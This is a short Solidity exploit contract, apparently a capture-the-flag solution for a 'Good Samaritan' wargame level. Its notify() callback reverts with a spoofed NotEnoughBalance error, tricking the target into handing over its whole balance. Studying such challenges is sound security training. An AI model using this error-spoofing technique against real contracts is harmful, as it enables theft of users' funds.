// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {INotifyable, GoodSamaritan} from "../instances/Ilevel27.sol";

contract BadBenefactor is INotifyable {
    GoodSamaritan immutable goodSamaritan;

    error NotEnoughBalance();

    constructor(address _goodSamaritan) {
        goodSamaritan = GoodSamaritan(_goodSamaritan);
    }

    function beg() public {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 ammount) external pure {
        if (ammount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
